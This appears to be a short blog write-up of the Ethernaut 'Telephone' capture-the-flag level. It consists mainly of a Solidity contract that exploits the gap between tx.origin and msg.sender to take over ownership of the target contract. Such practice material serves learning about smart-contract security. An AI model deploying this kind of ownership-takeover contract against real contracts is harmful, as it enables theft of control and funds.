+++
title = 'Ethernaut Level 4 - Telephone'
date = 2024-08-28T16:14:08+02:00
draft = false

featured_image =  '/images/ethernaut.png'
background_image= '/images/ethernaut.png'
summary = 'Abuse the fact that tx.origin and msg.sender are different'
tags = [ 'writeups' , 'blockchain' ]
+++

```solidity
// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.25;

// tx.origin := Initial address of transaction chain
// msg.sender := previous address in transaction chain
// Solution: Make a contract to chall `changeOwner` 
// tx.origin (player) != msg.sender (contract)
interface Telephone {
    function changeOwner(address _owner) external ;
}


contract hackTelephone {
    Telephone originalContract;

    constructor(address _addr){
        originalContract = Telephone(_addr);
    }

    function hack(address _targetaddr) public {
        originalContract.changeOwner(_targetaddr);
    }
}


```